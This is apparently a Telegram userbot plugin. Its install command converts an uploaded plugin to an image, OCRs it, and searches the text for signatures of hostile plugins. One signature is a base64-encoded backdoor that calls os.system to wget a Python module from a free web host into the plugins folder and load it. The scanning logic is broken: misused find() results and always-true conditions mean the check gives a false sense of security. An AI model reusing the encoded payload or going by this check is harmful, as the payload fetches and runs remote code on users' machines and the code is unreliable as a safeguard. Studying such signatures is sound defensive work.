# Kang with credit you gey
# Created with efforts by @keinshin for Black Lightning
# You cant hack my users with that bug and also less chance of getting hack via any other plugin


import cv2
import pytesseract

import urllib.request
import asyncio
import numpy as np
import os
import pandas as pd
from pathlib import Path




import re
from userbot import ALIVE_NAME
import pygments
from pygments.lexers import Python3Lexer
from pygments.formatters import ImageFormatter




from math import ceil
from userbot import bot
from userbot.thunderconfig import Config

DEFAULTUSER = (
    str(ALIVE_NAME) if ALIVE_NAME else "Set ALIVE_NAME in config vars in Heroku"
)

def url_to_image(url):
    resp = urllib.request.Request(url, headers={'User-Agent': "Magic Browser"})
    con = urllib.request.urlopen(resp)
    image = np.asarray(bytearray(con.read()), dtype="uint8")
    image2 = cv2.imdecode(image, cv2.IMREAD_GRAYSCALE)
    return image2

def img2text(URL):
    if re.findall('^http', URL):
        im = url_to_image(URL)
    else:
        img = cv2.imread(URL)
        im = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    config = ('-l eng --oem 1 --psm 6')
    text = pytesseract.image_to_string(im, config=config)
    text2 = text.rstrip('\n')
    return (text2)

def img2textdir(dirpath):
    files = []
    for file in os.listdir(dirpath):
        if file.endswith('.jpg') or file.endswith('.png'):
            files.append(os.path.join(dirpath, file))
    texts=[]
    names=[]
    for i in files:
        text=img2text(i)
        texts.append(text)
        names.append(i)
    translation={'Image':names, 'Text':texts}
    df=pd.DataFrame(data=translation)
    df.to_excel(dirpath+'/img2text.xlsx', sheet_name = 'ImagestoText')
    return df
    
    
    
@borg.on(lightning_cmd(pattern="install"))
async def install(lightning):
    if lightning.fwd_from:
        return
    code = await lightning.client.download_media(await lightning.get_reply_message(), './pics/')
    openn = open(code, "r")
    hmm = openn.read()
    openn.close()
    pygments.highlight(f"{hmm}", Python3Lexer(), ImageFormatter(font_name="DejaVu Sans Mono", line_numbers=True), "yo.png")
    
    
    # await lightning.client.send_file(lightning.chat_id, "yo.png", force_document=False, reply_to=event.reply_to_msg_id)
    plugin = cv2.imread('yo.png')
    
    grey = cv2.cvtColor(plugin, cv2.COLOR_BGR2GRAY)
    cv2.imwrite('plugin.png', grey)

    ddd  = img2text('plugin.png')
    hmm = f"{ddd}"

    secure =  str(hmm.find("if event.fwd_from"))
    second = str(hmm.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
    sete = str(hmm.find("borg.me.phone"))
    if len(secure) == "5" or "4096":
        await lightning.edit("**Big file it will take a minute to check its secure**")
    else:
        return
    if secure not in hmm:
        await lightning.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
    else:
        return
    if second in hmm:
        await lightning.edit(f"**Alert Found Plugin for Hacking**")
    else:
        return
    if sete in hmm:
        await lightning.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
    else:
     return
    
    if lightning.reply_to_msg_id:
        try:
            downloaded_file_name = (
                await lightning.client.download_media(  # pylint:disable=E0602
                    await lightning.get_reply_message(),
                    "userbot/plugins/",  # pylint:disable=E0602
                )
            )
            if "(" not in downloaded_file_name:
                path1 = Path(downloaded_file_name)
                krish_blac = path1.stem
                load_module(krish_blac.replace(".py", ""))
                await lightning.edit(f"Wait Installing.... ")
                await asyncio.sleep(2)
                await lightning.edit(
                    "{}SucessFully Installed ....".format(
                        os.path.basename(downloaded_file_name)
                    )
                )
            else:
                os.remove(downloaded_file_name)
                await lightning.edit("**Master You Already Have This Plugin \nPlz Try `.help <cmd name>` To See.**")
        except Exception as e:  # pylint:disable=C0103,W0703
            await lightning.edit(str(e))
            os.remove(downloaded_file_name)
    await asyncio.sleep(DELETE_TIMEOUT)
    os.remove('plugin.png')
    os.remove('yo.png')
    await lightning.delete() 
    
